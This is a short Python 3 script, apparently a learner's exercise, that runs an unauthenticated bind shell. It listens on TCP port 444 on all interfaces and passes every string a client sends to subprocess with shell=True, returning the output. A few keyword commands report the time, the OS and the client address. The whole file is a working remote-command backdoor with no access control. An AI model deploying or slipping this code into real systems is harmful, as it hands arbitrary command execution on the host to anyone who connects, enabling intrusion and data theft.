#shell_server.py for python3
import socket
import subprocess
import time
import platform

#try to create a socket s
try:
    
    s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    #s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("",444)) #bind to all ip in the range
    s.listen(1) #listen for 1 connection
    
    #while the socket is created, keep the socket open
    while True:
        connexion, client_address = s.accept()
        print ("connexion from :" +str(client_address))
        
        #while there is a connection, ask to receive a cmd and reply accordingly
        while True:
            connexion.send(bytes("\nEnter cmd : ", "utf-8"))
            cmd = connexion.recv(8192).decode()
            # p = subprocess.Popen(cmd.split(" "),shell=True
            p = subprocess.Popen(cmd,shell=True
                ,stdout=subprocess.PIPE,stderr = subprocess.PIPE)
            out , err = p.communicate()
            
            connexion.send(out)        
            
            #if cmd is file the open the file and display for client
            if cmd == "File": 
                #print("Received command: File") #for debuggin purposes
                p= subprocess.Popen(["cat", "file1.txt"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE)
                
                out,err = p.communicate()
                
                connexion.send(out)
            
            #if cmd is time send the current time to the client    
            elif cmd == "TIME":
                t = time.localtime()
                current_time = time.strftime("%H:%M:%S", t)
                print("cmd = time") #for debugging purposes
                connexion.send(current_time.encode())
            
            #if the cmd is os send the os name and version to the client    
            elif cmd == "OS":
                #print("cmd = OS") #for debugging purposes
                os = platform.platform()
                connexion.send(os.encode())
             
            #if the cmd is ip .... i guess i dont need this because i want to display client ip address    
            elif cmd == "IP":
                #print(client_address) #for debugging purposes
                connexion.send(str(client_address).encode())
                
             
            #if the cmd is exit then close the socket and exit (do not listen)    
            elif cmd == "EXIT":
                #print("cmd = exit") #for debugging purposes
                s.close()
                break


#finally close the connection                             
finally:
    s.close()